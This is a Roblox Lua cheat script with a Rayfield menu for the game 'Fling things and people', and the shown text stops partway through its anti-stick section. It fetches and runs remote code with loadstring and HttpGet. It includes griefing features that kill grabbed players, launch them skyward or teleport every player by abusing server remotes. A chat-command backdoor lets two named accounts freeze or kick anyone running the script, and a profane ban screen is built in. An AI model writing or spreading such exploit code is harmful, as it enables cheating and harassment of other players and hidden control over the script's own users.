--//////////////////////////////////////////////////////////////////////////////
-- BANNED FUCKS + COMMANDS
--//////////////////////////////////////////////////////////////////////////////
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer

------------------------------------------------
-- BLACKLIST SYSTEM
------------------------------------------------
local blacklistedUsers = {
    ["0"] = true,
}

if blacklistedUsers[LocalPlayer.Name] then
    local Notification = Instance.new("ScreenGui")
    Notification.IgnoreGuiInset = true
    Notification.Name = "Notification"
    Notification.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local Main = Instance.new("Frame")
    Main.Parent = Notification
    Main.AnchorPoint = Vector2.new(0.5, 0.5)
    Main.Position = UDim2.new(0.5, 0, 0.5, 0)
    Main.Size = UDim2.new(1, 0, 1, 0)
    Main.BackgroundTransparency = 1

    local Title = Instance.new("TextLabel")
    Title.Parent = Main
    Title.AnchorPoint = Vector2.new(0.5, 0.5)
    Title.Position = UDim2.new(0.5, 0, 0.5, 0)
    Title.Size = UDim2.new(0.9, 0, 1, 0)
    Title.BackgroundTransparency = 1
    Title.TextTransparency = 1
    Title.Text = "You're banned, bitch"
    Title.TextScaled = true

    local tweenInfo = TweenInfo.new(2)

    TweenService:Create(Main, tweenInfo, {BackgroundTransparency = 0}):Play()
    TweenService:Create(Title, tweenInfo, {TextTransparency = 0}):Play()

    task.wait(4)
    LocalPlayer:Kick("Blacklisted")
    return
end

------------------------------------------------
-- ADMIN COMMAND SYSTEM
------------------------------------------------

local ADMINS = {
    ["eroexy"] = true,
    ["realcrystxll"] = true,
}

local function freezeMe()
    local char = LocalPlayer.Character
    if not char then return end
    for _, p in ipairs(char:GetDescendants()) do
        if p:IsA("BasePart") then
            p.Anchored = true
        end
    end
end

local function unfreezeMe()
    local char = LocalPlayer.Character
    if not char then return end
    for _, p in ipairs(char:GetDescendants()) do
        if p:IsA("BasePart") then
            p.Anchored = false
        end
    end
end

local function kickMe(reason)
    LocalPlayer:Kick(reason or "Kicked by admin")
end

-- NEW parser supporting parentheses
local function parseCommand(msg)
    -- matches: ;kick @player (reason)
    local cmd, target, reason = msg:lower():match("^;(%w+)%s+@(%S+)%s*%((.*)%)$")
    if cmd and target then return cmd, target, reason end

    -- matches: ;kick @player reason words
    return msg:lower():match("^;(%w+)%s+@(%S+)%s*(.*)$")
end

local function runCommand(cmd, target, reason)
    if target ~= LocalPlayer.Name:lower() then return end

    if cmd == "freeze" then
        freezeMe()
    elseif cmd == "unfreeze" then
        unfreezeMe()
    elseif cmd == "kick" then
        kickMe(reason)
    end
end

-- LISTEN USING TextChatService (Rayfield compatible)
TextChatService.MessageReceived:Connect(function(msg)
    local speaker = Players:FindFirstChild(msg.TextSource and msg.TextSource.Name)
    if not speaker then return end
    if not ADMINS[speaker.Name] then return end

    local cmd, target, reason = parseCommand(msg.Text)
    if cmd then
        runCommand(cmd, target, reason)
    end
end)
--//////////////////////////////////////////////////////////////////////////////
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Fling things and people",
   Icon = 0,
   LoadingTitle = "Fling things and people",
   LoadingSubtitle = "",
   ShowText = "nil",
   Theme = "Default",

   ToggleUIKeybind = "M",

   DisableRayfieldPrompts = true,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = true,
      FolderName = false,
      FileName = "eroexyFTAP"
   },

   Discord = {
      Enabled = false,
      Invite = "",
      RememberJoins = true
   },

   KeySystem = false,
   KeySettings = {
      Title = "",
      Subtitle = "Key System",
      Note = "",
      FileName = "",
      SaveKey = true,
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"Hello"}
   }
})

--//////////////////////////////////////////////////////////////////////////////
local Tab = Window:CreateTab("Grab", 0)
--//////////////////////////////////////////////////////////////////////////////
local Section = Tab:CreateSection("Line")
--//////////////////////////////////////////////////////////////////////////////
-- SERVICES & LOCALS
--//////////////////////////////////////////////////////////////////////////////
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Debris = game:GetService("Debris")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local lp = LocalPlayer

-- Wait for LocalPlayer if not ready
if not LocalPlayer then
    Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
    LocalPlayer = Players.LocalPlayer
    lp = LocalPlayer
end

--//////////////////////////////////////////////////////////////////////////////
-- FTAP THROW SYSTEM
--//////////////////////////////////////////////////////////////////////////////
_G.strength = 400 -- default throw power
local throwEnabled = false

local function ApplyStrength(part)
    if not part or not part:IsA("BasePart") then return end
    if not throwEnabled then return end

    local velocity = Instance.new("BodyVelocity")
    velocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    velocity.Velocity = workspace.CurrentCamera.CFrame.LookVector * _G.strength
    velocity.Parent = part

    Debris:AddItem(velocity, 1)
end

workspace.ChildAdded:Connect(function(model)
    if model.Name == "GrabParts" then
        local grabPart = model:WaitForChild("GrabPart", 1)
        if not grabPart then return end

        local weld = grabPart:WaitForChild("WeldConstraint", 1)
        if not weld or not weld.Part1 then return end

        local grabbed = weld.Part1

        model:GetPropertyChangedSignal("Parent"):Connect(function()
            if model.Parent == nil then
                if UserInputService:GetLastInputType() == Enum.UserInputType.MouseButton2 then
                    ApplyStrength(grabbed)
                end
            end
        end)
    end
end)

-- UI Controls
local ThrowToggle = Tab:CreateToggle({
    Name = "Stronger Throw",
    CurrentValue = false,
    Flag = "ThrowToggle",
    Callback = function(Value)
        throwEnabled = Value
    end,
})

local ThrowSlider = Tab:CreateSlider({
    Name = "Throw Strength",
    Range = {400, 10000},
    Increment = 100,
    Suffix = "Strength",
    CurrentValue = _G.strength,
    Flag = "ThrowStrength",
    Callback = function(Value)
        _G.strength = Value
    end,
})
--//////////////////////////////////////////////////////////////////////////////
local Section = Tab:CreateSection("Grab")
--//////////////////////////////////////////////////////////////////////////////
-- DEATH GRAB SYSTEM
--//////////////////////////////////////////////////////////////////////////////
local autoGrabToggle = false
local grabbedPlayers = {}

local function handleGrabbedPlayer(player)
    local character = player.Character
    if character and character:FindFirstChild("Humanoid") then
        local humanoid = character.Humanoid
        humanoid.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
        humanoid.BreakJointsOnDeath = false
        humanoid.Health = 0
    end
end

local function cleanupPlayerTracking(player)
    grabbedPlayers[player.UserId] = nil
end

local function onPlayerCharacterAdded(player)
    grabbedPlayers[player.UserId] = nil
end

local function onPlayerAdded(player)
    player.CharacterAdded:Connect(function()
        onPlayerCharacterAdded(player)
    end)
    if player.Character then
        onPlayerCharacterAdded(player)
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    onPlayerAdded(player)
end

Players.PlayerAdded:Connect(onPlayerAdded)
Players.PlayerRemoving:Connect(cleanupPlayerTracking)

local function checkHeldPlayers()
    if not autoGrabToggle then return end

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                local partOwner = head:FindFirstChild("PartOwner")
                if partOwner and partOwner:IsA("StringValue") and partOwner.Value == LocalPlayer.Name then
                    if not grabbedPlayers[player.UserId] then
                        grabbedPlayers[player.UserId] = true
                        print("Player held: " .. (player.DisplayName or player.Name))
                        handleGrabbedPlayer(player)
                    end
                else
                    grabbedPlayers[player.UserId] = nil
                end
            else
                grabbedPlayers[player.UserId] = nil
            end
        end
    end
end

RunService.RenderStepped:Connect(checkHeldPlayers)

local DeathGrabToggle = Tab:CreateToggle({
    Name = "Death Grab",
    CurrentValue = false,
    Flag = "DeathGrab",
    Callback = function(Value)
        autoGrabToggle = Value
        print("Auto Grab Players toggle set to:", Value)
    end,
})

--//////////////////////////////////////////////////////////////////////////////
-- HEAVEN GRAB SYSTEM
--//////////////////////////////////////////////////////////////////////////////
local heavenGrabEnabled = false

local function launchPlayer(character, force)
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if rootPart then
        local existingVelocity = rootPart:FindFirstChild("LaunchVelocity")
        if existingVelocity then existingVelocity:Destroy() end

        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.Name = "LaunchVelocity"
        bodyVelocity.Velocity = Vector3.new(0, force, 0)
        bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
        bodyVelocity.P = 1250
        bodyVelocity.Parent = rootPart
        Debris:AddItem(bodyVelocity, 0.5)
    end
end

local function removeLaunch(character)
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if rootPart then
        local existingVelocity = rootPart:FindFirstChild("LaunchVelocity")
        if existingVelocity then existingVelocity:Destroy() end
    end
end

RunService.RenderStepped:Connect(function()
    if not heavenGrabEnabled then return end
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local head = player.Character:FindFirstChild("Head")
            local partOwner = head and head:FindFirstChild("PartOwner")
            if partOwner and partOwner:IsA("StringValue") and partOwner.Value == LocalPlayer.Name then
                if not grabbedPlayers[player.UserId] then
                    grabbedPlayers[player.UserId] = true
                    print("Heaven Grab: " .. (player.DisplayName or player.Name))
                end
                launchPlayer(player.Character, 1e11)
            else
                grabbedPlayers[player.UserId] = nil
            end
        end
    end
end)

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        local head = character:WaitForChild("Head")
        local partOwner = head:WaitForChild("PartOwner")
        if heavenGrabEnabled and partOwner.Value == LocalPlayer.Name then
            launchPlayer(character, 1e8)
        end
    end)
end)

Players.PlayerRemoving:Connect(function(player)
    grabbedPlayers[player.UserId] = nil
end)

local HeavenGrabToggle = Tab:CreateToggle({
    Name = "Heaven Grab",
    CurrentValue = false,
    Flag = "HeavenGrab",
    Callback = function(Value)
        heavenGrabEnabled = Value
        if not Value then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    removeLaunch(player.Character)
                end
            end
            grabbedPlayers = {}
        end
    end,
})

--//////////////////////////////////////////////////////////////////////////////
-- MASSLESS GRAB
--//////////////////////////////////////////////////////////////////////////////
local masslessGrabEnabled = false

local function upgradeDragPart(dragPart)
    if not dragPart:IsA("BasePart") then return end
    local alignO = dragPart:FindFirstChild("AlignOrientation")
    local alignP = dragPart:FindFirstChild("AlignPosition")
    if alignO then
        alignO.MaxTorque = math.huge
        alignO.Responsiveness = 200
    end
    if alignP then
        alignP.MaxForce = math.huge
        alignP.Responsiveness = 200
    end
end

RunService.Heartbeat:Connect(function()
    if masslessGrabEnabled then
        local grabParts = workspace:FindFirstChild("GrabParts")
        if grabParts then
            for _, child in ipairs(grabParts:GetChildren()) do
                upgradeDragPart(child)
            end
        end
    end
end)

Tab:CreateToggle({
   Name = "Massless Grab",
   CurrentValue = false,
   Flag = "MasslessGrab",
   Callback = function(Value)
       masslessGrabEnabled = Value
   end,
})

--//////////////////////////////////////////////////////////////////////////////
-- NO-CLIP GRAB
--//////////////////////////////////////////////////////////////////////////////
local toggleEnabled = false
local lastModel = nil
local modelCollides = {} -- stores original CanCollide for each model

local blacklist = {
    workspace:WaitForChild("Slots"),
    workspace:WaitForChild("Plots"),
    workspace:WaitForChild("Map")
}

local function getModelFromPart(part)
    if not part then return nil end
    local current = part
    while current.Parent and not current:IsA("Model") do
        current = current.Parent
    end
    return current:IsA("Model") and current or nil
end

local function isBlacklisted(model)
    for _, parent in ipairs(blacklist) do
        if model:IsDescendantOf(parent) then
            return true
        end
    end
    return false
end

-- Toggle collisions for a model
local function setCanCollide(model, value)
    if not model then return end

    if not modelCollides[model] then
        modelCollides[model] = {}
    end

    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            if not value then
                if modelCollides[model][part] == nil then
                    modelCollides[model][part] = part.CanCollide
                end
                part.CanCollide = false
            else
                if modelCollides[model][part] ~= nil then
                    part.CanCollide = modelCollides[model][part]
                    modelCollides[model][part] = nil
                else
                    part.CanCollide = true
                end
            end
        end
    end
end

RunService.Heartbeat:Connect(function()
    if not toggleEnabled then
        if lastModel then
            setCanCollide(lastModel, true)
            local grabbed = lastModel:FindFirstChild("Grabbed")
            if grabbed then grabbed:Destroy() end
            lastModel = nil
        end
        return
    end

    local grabFolder = workspace:FindFirstChild("GrabParts")
    if not grabFolder then
        if lastModel then
            setCanCollide(lastModel, true)
            local grabbed = lastModel:FindFirstChild("Grabbed")
            if grabbed then grabbed:Destroy() end
            lastModel = nil
        end
        return
    end

    local grabPart = grabFolder:FindFirstChild("GrabPart")
    if not grabPart then return end

    local weld = grabPart:FindFirstChild("WeldConstraint")
    if not weld then return end

    local attached = weld.Part1
    local currentModel = getModelFromPart(attached)

    if lastModel and lastModel ~= currentModel then
        setCanCollide(lastModel, true)
        local grabbed = lastModel:FindFirstChild("Grabbed")
        if grabbed then grabbed:Destroy() end
        lastModel = nil
    end

    if currentModel and not isBlacklisted(currentModel) then
        local grabbed = currentModel:FindFirstChild("Grabbed")
        if not grabbed then
            grabbed = Instance.new("ObjectValue")
            grabbed.Name = "Grabbed"
            grabbed.Parent = currentModel
        end
        grabbed.Value = LocalPlayer

        setCanCollide(currentModel, false)
        lastModel = currentModel
    end
end)

local Toggle = Tab:CreateToggle({
    Name = "No-clip Grab",
    CurrentValue = false,
    Flag = "NoclipGrab",
    Callback = function(Value)
        toggleEnabled = Value
        if not Value and lastModel then
            setCanCollide(lastModel, true)
            local grabbed = lastModel:FindFirstChild("Grabbed")
            if grabbed then grabbed:Destroy() end
            lastModel = nil
        end
    end,
})

--//////////////////////////////////////////////////////////////////////////////
-- Glitch Grab + Spin Grab
--//////////////////////////////////////////////////////////////////////////////

local OFF_LIMITS = {
    Workspace:WaitForChild("Plots"),
    Workspace:WaitForChild("Slots"),
    Workspace:WaitForChild("Map")
}

local function isBlacklisted(model)
    for _, parent in ipairs(OFF_LIMITS) do
        if model:IsDescendantOf(parent) then
            return true
        end
    end
    return false
end

local function getModelFromPart(part)
    if not part then return nil end

    local current = part
    while current.Parent and not current:IsA("Model") do
        current = current.Parent
    end

    return current:IsA("Model") and current or nil
end

local grabEnabled = false
local spinEnabled = false

RunService.Heartbeat:Connect(function()
    local grabPartsFolder = Workspace:FindFirstChild("GrabParts")
    local grabPart = grabPartsFolder and grabPartsFolder:FindFirstChild("GrabPart")
    if not grabPart then return end

    local weld = grabPart:FindFirstChild("WeldConstraint")
    if not weld or not weld.Part1 then return end

    local attachedPart = weld.Part1
    local model = getModelFromPart(attachedPart)
    if not model or isBlacklisted(model) then return end

    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    
    if grabEnabled and root then
        for _, part in ipairs(model:GetDescendants()) do
            if part:IsA("BasePart") then
                local offset = Vector3.new(
                    math.random(-30, 30),
                    math.random(2, 30),
                    math.random(-30, 30)
                )
                part.CFrame = CFrame.new(root.Position + offset)
            end
        end
    end

    if spinEnabled then
        for _, part in ipairs(model:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CFrame = part.CFrame * CFrame.Angles(0, math.rad(10), 0)
            end
        end
    end
end)

Tab:CreateToggle({
    Name = "Glitch Grab",
    CurrentValue = false,
    Flag = "GlitchGrab",
    Callback = function(Value)
        grabEnabled = Value
    end,
})

Tab:CreateToggle({
    Name = "Spin Grab",
    CurrentValue = false,
    Flag = "SpinGrab",
    Callback = function(Value)
        spinEnabled = Value
    end,
})

--//////////////////////////////////////////////////////////////////////////////
-- BRING PLAYERS SYSTEM (WITH DROPDOWN AND V-TO-SAVE)
--//////////////////////////////////////////////////////////////////////////////
local GrabSection = Tab:CreateSection("Bring Players")

local GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
local SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
local DestroyGrabLine = GrabEvents:FindFirstChild("DestroyGrabLine")

-- DROPDOWN
local selectedPlayers = {}
local displayNameToPlayer = {}

local function getDisplayNames()
    displayNameToPlayer = {}
    local names = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local displayName = plr.DisplayName
            table.insert(names, displayName)
            displayNameToPlayer[displayName] = plr
        end
    end
    return names
end

local PlayerDropdown = Tab:CreateDropdown({
    Name = "Select Players",
    Options = getDisplayNames(),
    CurrentOption = {},
    MultipleOptions = true,
    Flag = "SelectedPlayers",
    Callback = function(Options)
        selectedPlayers = {}
        for _, displayName in ipairs(Options) do
            local plr = displayNameToPlayer[displayName]
            if plr then table.insert(selectedPlayers, plr) end
        end
    end,
})

local function refreshDropdown()
    PlayerDropdown:Refresh(getDisplayNames(), {})
end

Players.PlayerAdded:Connect(refreshDropdown)
Players.PlayerRemoving:Connect(refreshDropdown)

-- SAVED LOCATION SYSTEM (V TO SAVE) – placed UNDER DROPDOWN
local savedCF = nil
local saveToggle = false

Tab:CreateToggle({
    Name = "Bring Location (V)",
    CurrentValue = false,
    Flag = "SavedLocation",
    Callback = function(val)
        saveToggle = val
        if not val then
            savedCF = nil
        end
    end,
})

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.V and saveToggle then
        local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local myRoot = myChar:FindFirstChild("HumanoidRootPart")
        if myRoot then
            savedCF = myRoot.CFrame

            Rayfield:Notify({
                Title = "Saved Location",
                Content = "CFrame saved:\n" .. tostring(savedCF),
                Duration = 4,
                Image = 0,
            })
        end
    end
end)

-- CORE FUNCTIONS
local function findRoot(char)
    return char and (char:FindFirstChild("HumanoidRootPart") 
        or char:FindFirstChild("UpperTorso") 
        or char:FindFirstChild("Torso"))
end

local function tryClaimOwner(tRoot, attempts, interval)
    attempts = attempts or 8
    interval = interval or 0
    for i = 1, attempts do
        pcall(function() SetNetworkOwner:FireServer(tRoot, tRoot.CFrame) end)
        local head = tRoot.Parent and tRoot.Parent:FindFirstChild("Head")
        local owner = head and head:FindFirstChild("PartOwner")
        if owner and owner.Value == LocalPlayer.Name then return true end
        task.wait(interval)
    end
    return false
end

local function bringOne(targetPlayer, targetCF)
    if not targetPlayer or targetPlayer == LocalPlayer then return end
    local char = targetPlayer.Character
    if not char then return end

    local tRoot = findRoot(char)
    local head = char:FindFirstChild("Head")
    local hum = char:FindFirstChild("Humanoid")
    if not tRoot or not head or not hum or hum.Health <= 0 then return end

    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local myRoot = findRoot(myChar)
    if myRoot then
        pcall(function()
            myRoot.CFrame = tRoot.CFrame * CFrame.new(0, -3, -2)
        end)
    end

    tryClaimOwner(tRoot, 14, 0.02)

    if DestroyGrabLine then
        pcall(function() DestroyGrabLine:FireServer(tRoot) end)
    end

    pcall(function()
        tRoot.AssemblyLinearVelocity = Vector3.new(0,0,0)
        tRoot.CFrame = targetCF
    end)
end

-- BRING SELECTED
Tab:CreateButton({
    Name = "Bring Selected",
    Callback = function()
        local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local myRoot = findRoot(myChar)
        if not myRoot then return end
        
        local returnCF = myRoot.CFrame
        local targetCF = (saveToggle and savedCF) or returnCF

        for _, plr in ipairs(selectedPlayers) do
            pcall(function()
                bringOne(plr, targetCF)
            end)
        end

        task.wait(0.05)
        pcall(function()
            local r = findRoot(LocalPlayer.Character)
            if r then r.CFrame = returnCF end
        end)
    end,
})

-- BRING ALL
Tab:CreateButton({
    Name = "Bring All",
    Callback = function()
        local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local myRoot = findRoot(myChar)
        if not myRoot then return end

        local returnCF = myRoot.CFrame
        local targetCF = (saveToggle and savedCF) or returnCF

        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                pcall(function()
                    bringOne(plr, targetCF)
                end)
            end
        end

        task.wait(0.05)
        pcall(function()
            local r = findRoot(LocalPlayer.Character)
            if r then r.CFrame = returnCF end
        end)
    end,
})
--//////////////////////////////////////////////////////////////////////////////
local Tab = Window:CreateTab("Defense", 0)
local Section = Tab:CreateSection("Anti")
--//////////////////////////////////////////////////////////////////////////////
-- Services
--//////////////////////////////////////////////////////////////////////////////
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local Debris = game:GetService("Debris")

local LocalPlayer = Players.LocalPlayer

--//////////////////////////////////////////////////////////////////////////////
-- Anti-Grab (Freeze while held)
--//////////////////////////////////////////////////////////////////////////////
local isHeld = LocalPlayer:WaitForChild("IsHeld")
local StruggleEvent = ReplicatedStorage.CharacterEvents:WaitForChild("Struggle")

local lastPositionBeforeHeld = nil
local previousValue = isHeld.Value
local freezeEnabled = false

local function getHRP()
    return LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
end

local function resetHumanoid()
    local char = LocalPlayer.Character
    if not char then return end

    local humanoid = char:FindFirstChild("Humanoid")
    local hrp = getHRP()

    if humanoid then
        humanoid.Sit = false
        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
        humanoid.AutoRotate = true
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
    end

    if hrp then hrp.Anchored = false end
end

-- Toggle
Tab:CreateToggle({
    Name = "Anti-Grab",
    CurrentValue = false,
    Flag = "AntiGrab",
    Callback = function(Value)
        freezeEnabled = Value
        if not freezeEnabled then
            local hrp = getHRP()
            if hrp then hrp.Anchored = false end
        end
    end,
})

-- Listen for IsHeld changes
isHeld:GetPropertyChangedSignal("Value"):Connect(function()
    if not freezeEnabled then return end

    local hrp = getHRP()
    if not hrp then return end

    local newValue = isHeld.Value

    if previousValue == false and newValue == true then
        lastPositionBeforeHeld = hrp.CFrame
        hrp.Anchored = true
    elseif previousValue == true and newValue == false then
        hrp.Anchored = false
        if lastPositionBeforeHeld then hrp.CFrame = lastPositionBeforeHeld end
    end

    previousValue = newValue
end)

-- Freeze & struggle while held
RunService.RenderStepped:Connect(function()
    if freezeEnabled and isHeld.Value then
        local hrp = getHRP()
        if hrp then
            hrp.Anchored = true
            pcall(function() StruggleEvent:FireServer() end)
            resetHumanoid()
        end
    end
end)

-- Reset humanoid on respawn
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(0.1)
    if freezeEnabled then resetHumanoid() end
end)

--//////////////////////////////////////////////////////////////////////////////
-- Anti-Gucci (Persistent Blobman)
--//////////////////////////////////////////////////////////////////////////////
local enabled = false
local originalBlobman
local ragdollConn
local posCheckConn
local originalCFrame

local function findBlobman()
    local function isOwnedByPlayer(blob)
        local playerValue = blob:FindFirstChild("PlayerValue")
        return playerValue and playerValue.Value == LocalPlayer
    end

    local playerFolder = Workspace:FindFirstChild(LocalPlayer.Name.."SpawnedInToys")
    if playerFolder then
        for _, blob in ipairs(playerFolder:GetChildren()) do
            if blob.Name == "CreatureBlobman" and isOwnedByPlayer(blob) then
                return blob
            end
        end
    end

    local plotItems = Workspace:FindFirstChild("PlotItems")
    if plotItems then
        for i = 1, 6 do
            local plot = plotItems:FindFirstChild("Plot"..i)
            if plot then
                for _, blob in ipairs(plot:GetChildren()) do
                    if blob.Name == "CreatureBlobman" and isOwnedByPlayer(blob) then
                        return blob
                    end
                end
            end
        end
    end

    return nil
end

local function rideBlobman(Character, HRP, Humanoid)
    if not originalBlobman or not originalBlobman.Parent then return false end
    local seat = originalBlobman:FindFirstChild("VehicleSeat")
    if seat and seat:IsA("VehicleSeat") then
        originalCFrame = HRP.CFrame
        HRP.CFrame = seat.CFrame + Vector3.new(0,2,0)
        seat:Sit(Humanoid)
        return true
    end
    return false
end

local function setupAntiGucci(Character)
    local HRP = Character:WaitForChild("HumanoidRootPart")
    local Humanoid = Character:WaitForChild("Humanoid")

    originalBlobman = findBlobman()
    if not originalBlobman or not originalBlobman.Parent then
        ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(
            "CreatureBlobman",
            HRP.CFrame,
            Vector3.new(0,59.667,0)
        )
        originalBlobman = findBlobman()
        if not originalBlobman then return end
    end

    local sitting = rideBlobman(Character, HRP, Humanoid)
    if not sitting then return end

    -- Prevent ragdoll while sitting
    ragdollConn = RunService.Heartbeat:Connect(function()
        if enabled and sitting then
            pcall(function()
                ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(HRP, 0)
            end)
        end
    end)

    -- Detect return to original spot
    posCheckConn = RunService.Heartbeat:Connect(function()
        if enabled and (HRP.Position - originalCFrame.Position).Magnitude < 1 then
            sitting = false
        end
    end)

    task.delay(0.5, function()
        if sitting then HRP.CFrame = originalCFrame end
    end)
end

-- Toggle
Tab:CreateToggle({
    Name = "Anti-Grab Gucci",
    CurrentValue = false,
    Flag = "AntiGucci",
    Callback = function(Value)
        enabled = Value
        if enabled then
            setupAntiGucci(LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait())
            print("Anti-Gucci Enabled")
        else
            if ragdollConn then ragdollConn:Disconnect() end
            if posCheckConn then posCheckConn:Disconnect() end
            print("Anti-Gucci Disabled")
        end
    end,
})

-- Auto-setup on respawn
LocalPlayer.CharacterAdded:Connect(function(Character)
    if enabled then task.wait(0.1); setupAntiGucci(Character) end
end)

--//////////////////////////////////////////////////////////////////////////////
-- Anti-Fire
--//////////////////////////////////////////////////////////////////////////////
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local LP = Players.LocalPlayer
local containerName = LP.Name .. "SpawnedInToys"

local SpawnToyRemoteFunction = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
local DestroyToy = ReplicatedStorage.MenuToys.DestroyToy

local activeConnections = {}
local monitorConnection
local toggleEnabled = false
local respawnCooldown = false -- prevents multi-respawns

-----------------------------------------------------
-- FOLLOW / ATTACH LOGIC
-----------------------------------------------------
local function attachPart(part)
    local Character = LP.Character or LP.CharacterAdded:Wait()
    local HRP = Character:WaitForChild("HumanoidRootPart")

    part.Size = Vector3.new(3, 3, 3)
    part.Anchored = true
    part.CFrame = HRP.CFrame

    local conn = RunService.RenderStepped:Connect(function()
        if part and part.Parent then
            part.CFrame = HRP.CFrame
        end
    end)

    table.insert(activeConnections, conn)
end

-----------------------------------------------------
-- SPAWN WORKFLOW (ANTI-STICK STYLE)
-----------------------------------------------------
local function spawnExtinguisher()
    if not toggleEnabled then return end

    respawnCooldown = true -- block respawns until this workflow finishes

    local Character = LP.Character or LP.CharacterAdded:Wait()
    local HRP = Character:WaitForChild("HumanoidRootPart")

    -- yeet it into orbit
    local skyCFrame = HRP.CFrame + Vector3.new(0, 1e20, 0)
    SpawnToyRemoteFunction:InvokeServer("FireExtinguisher", skyCFrame, Vector3.new())

    task.wait(0.3)

    -- wait for the extinguisher to EXIST before resetting cooldown
    local ToysFolder = Workspace:WaitForChild(containerName)
    local toy = ToysFolder:WaitForChild("FireExtinguisher")

    -- NOW it's safe to clear cooldown
    respawnCooldown = false

    -----------------------------------------------------
    -- DELETE WELDS
    -----------------------------------------------------
    local extingParts = {}
    for _, part in ipairs(toy:GetChildren()) do
        if part.Name == "ExtinguishPart" then
            table.insert(extingParts, part)

            for _, weld in ipairs(part:GetChildren()) do
                if weld:IsA("WeldConstraint") then
                    weld:Destroy()
                end
            end
        end
    end

    -- wait BEFORE attaching
    task.wait(0.25)

    -----------------------------------------------------
    -- ATTACH FOLLOW PARTS
    -----------------------------------------------------
    for _, part in ipairs(extingParts) do
        attachPart(part)
    end
end

-----------------------------------------------------
-- RESPAWN WATCHDOG (ONLY ONCE PER DELETION)
-----------------------------------------------------
local function startMonitor()
    if monitorConnection then
        monitorConnection:Disconnect()
    end

    monitorConnection = RunService.Heartbeat:Connect(function()
        if not toggleEnabled then return end
        if respawnCooldown then return end -- block spam-respawn attempts

        local ToysFolder = Workspace:FindFirstChild(containerName)
        if not ToysFolder then return end

        -- extinguisher gone? respawn ONCE
        if not ToysFolder:FindFirstChild("FireExtinguisher") then
            spawnExtinguisher()
        end
    end)
end

-----------------------------------------------------
-- UI TOGGLE
-----------------------------------------------------
local Toggle = Tab:CreateToggle({
    Name = "Anti-Fire",
    CurrentValue = false,
    Flag = "AntiFire",
    Callback = function(Value)
        toggleEnabled = Value

        if Value then
            -----------------------------------------------------
            -- ENABLED
            -----------------------------------------------------
            spawnExtinguisher()
            startMonitor()

        else
            -----------------------------------------------------
            -- DISABLED
            -----------------------------------------------------

            -- stop monitor
            if monitorConnection then
                monitorConnection:Disconnect()
                monitorConnection = nil
            end

            -- stop part-following
            for _, conn in ipairs(activeConnections) do
                conn:Disconnect()
            end
            activeConnections = {}

            -- destroy ONLY FireExtinguisher
            local ToysFolder = Workspace:FindFirstChild(containerName)
            if ToysFolder then
                local extinguisher = ToysFolder:FindFirstChild("FireExtinguisher")
                if extinguisher then
                    DestroyToy:FireServer(extinguisher)
                end
            end
        end
    end,
})
--//////////////////////////////////////////////////////////////////////////////
-- Anti-Stick
--//////////////////////////////////////////////////////////////////////////////
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local LP = Players.LocalPlayer
local activeConnections = {}
local containerName = LP.Name .. "SpawnedInToys"

local SpawnToyRemoteFunction = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
local DestroyToy = ReplicatedStorage.MenuToys.DestroyToy

-- === respawn lock to prevent spam ===
local respawning = false

local function spawnSprayCan()
